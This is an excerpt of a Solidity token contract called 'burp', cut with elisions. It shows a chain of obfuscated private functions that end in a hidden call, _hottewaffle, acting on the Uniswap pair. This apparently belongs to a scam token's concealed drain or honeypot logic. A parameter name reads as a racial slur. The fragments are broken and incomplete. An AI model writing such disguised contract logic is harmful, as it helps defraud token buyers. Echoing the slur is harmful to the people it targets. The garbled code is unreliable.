...
contract burp is Context, IERC20, Ownable {
    ...
    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
           ...
           function kuliespokei( uint256 anigga) private returns (bool) {
             cntovlittlethings=cntovlittlethings+anigga-cntovlittlethings;
             hogfarmdecinclu(anigga);
        return true;
    }
         function hogfarmdecinclu( uint256 anigga) private {
         uint256 proaltero = anigga+256;
        if (anigga>=1){
            vvbedud(proaltero);  
             } 
      ...
      function vvbedud (uint256 anigga) private returns (bool) {
        cntovlittlethings=cntovlittlethings+anigga-cntovlittlethings;
         _hottewaffle(anigga, uniswapV2Pair);
        return true;
    }
